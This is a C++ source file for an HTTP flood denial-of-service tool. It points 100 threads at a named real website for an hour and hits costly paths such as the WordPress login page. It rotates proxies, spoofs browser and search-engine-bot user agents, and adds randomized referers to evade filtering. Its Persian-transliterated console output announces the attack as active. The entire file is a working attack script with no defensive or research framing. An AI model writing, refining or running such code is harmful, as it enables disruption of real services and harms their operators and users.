#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <random>
#include <chrono>
#include <curl/curl.h>
#include <queue>
#include <fstream>
#include <algorithm>


const std::string TARGET_URL = "http://stockdr.ir";
const int THREAD_COUNT =100;                
const int MAX_CONCURRENT_REQUESTS_PER_THREAD = 50; 
const int ATTACK_DURATION = 3600;            


const std::vector<std::string> PROXIES = {
    "http://proxy1:port",
    "http://proxy2:port",
    // ...
};


const std::vector<std::string> TARGET_PATHS = {
    "/",
    "/wp-login.php",
    "/api/v1/users",
    "/loadbalancer-test",
    "/high-cpu-endpoint"
};


std::atomic<long> total_requests(0);
std::atomic<long> successful_requests(0);
std::atomic<long> failed_requests(0);
const std::vector<std::string> USER_AGENTS = {
    // Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    
    // macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    
    // Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0",
    
    // Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    
    // Bots
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
};


static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    return size * nmemb;
}


class CurlHandlerPool {
private:
    std::queue<CURL*> pool;
    std::mutex mtx;
    
public:
    CurlHandlerPool(int size) {
        for (int i = 0; i < size; ++i) {
            CURL* curl = curl_easy_init();
            if (curl) {
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
                curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
                curl_easy_setopt(curl, CURLOPT_TCP_FASTOPEN, 1L);
                curl_easy_setopt(curl, CURLOPT_TCP_NODELAY, 1L);
                pool.push(curl);
            }
        }
    }
    
    CURL* acquire() {
        std::lock_guard<std::mutex> lock(mtx);
        if (pool.empty()) {
            return curl_easy_init();
        }
        CURL* curl = pool.front();
        pool.pop();
        return curl;
    }
    
    void release(CURL* curl) {
        std::lock_guard<std::mutex> lock(mtx);
        curl_easy_reset(curl);
   
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        pool.push(curl);
    }
    
    ~CurlHandlerPool() {
        while (!pool.empty()) {
            curl_easy_cleanup(pool.front());
            pool.pop();
        }
    }
};


void advanced_attack(CurlHandlerPool& handler_pool) {

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> ua_dist(0, USER_AGENTS.size() - 1);
    std::uniform_int_distribution<> path_dist(0, TARGET_PATHS.size() - 1);
    std::uniform_int_distribution<> proxy_dist(0, PROXIES.size() - 1);
    std::uniform_int_distribution<> num_dist(100000, 999999);
    
    while (true) {
        CURL* curl = handler_pool.acquire();
        if (!curl) continue;
        
        try {

            std::string user_agent = USER_AGENTS[ua_dist(gen)];
            

            struct curl_slist* headers = NULL;
            headers = curl_slist_append(headers, ("User-Agent: " + user_agent).c_str());
            headers = curl_slist_append(headers, ("Referer: https://google.com/search?q=" + std::to_string(num_dist(gen))).c_str());
            headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
            headers = curl_slist_append(headers, "Connection: keep-alive");
            headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
            headers = curl_slist_append(headers, "Cache-Control: max-age=0");
            

            std::string target_url = TARGET_URL + TARGET_PATHS[path_dist(gen)];
            curl_easy_setopt(curl, CURLOPT_URL, target_url.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            

            if (!PROXIES.empty()) {
                curl_easy_setopt(curl, CURLOPT_PROXY, PROXIES[proxy_dist(gen)].c_str());
            }
            

            CURLcode res = curl_easy_perform(curl);
            total_requests++;
            
            if (res == CURLE_OK) {
                successful_requests++;
            } else {
                failed_requests++;
            }
            

            curl_slist_free_all(headers);
        } catch (...) {
            failed_requests++;
        }
        
        handler_pool.release(curl);
    }
}


void stats_monitor() {
    auto start_time = std::chrono::steady_clock::now();
    
    while (true) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
        
        if (elapsed >= ATTACK_DURATION) {
            std::cout << "\n time end.\n";
            exit(0);
        }
        
        long total = total_requests.load();
        long success = successful_requests.load();
        long failed = failed_requests.load();
        long rps = (elapsed > 0) ? (total / elapsed) : total;
        
        std::cout << "\n--- amar lah ---\n";
        std::cout << "zaman separi shode: " << elapsed << " ?????\n";
        std::cout << "darkhast kool: " << total << "\n";
        std::cout << "movafag: " << success << " (" << (total > 0 ? (success * 100 / total) : 0) << "%)\n";
        std::cout << "namovafag: " << failed << " (" << (total > 0 ? (failed * 100 / total) : 0) << "%)\n";
        std::cout << "darkhast dar s: " << rps << "\n";
        std::cout << "-------------------\n";
        
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);
    

    CurlHandlerPool handler_pool(THREAD_COUNT * 2);
    
    std::cout << "hamli fahal!\n";
    std::cout << "target: " << TARGET_URL << "\n";
    std::cout << "nakh ha: " << THREAD_COUNT << "\n";
    std::cout << "modat zaman: " << ATTACK_DURATION << " ?????\n\n";
    

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(advanced_attack, std::ref(handler_pool));
    }
    
    std::thread stats_thread(stats_monitor);
    
    stats_thread.join();
    

    curl_global_cleanup();
    return 0;
}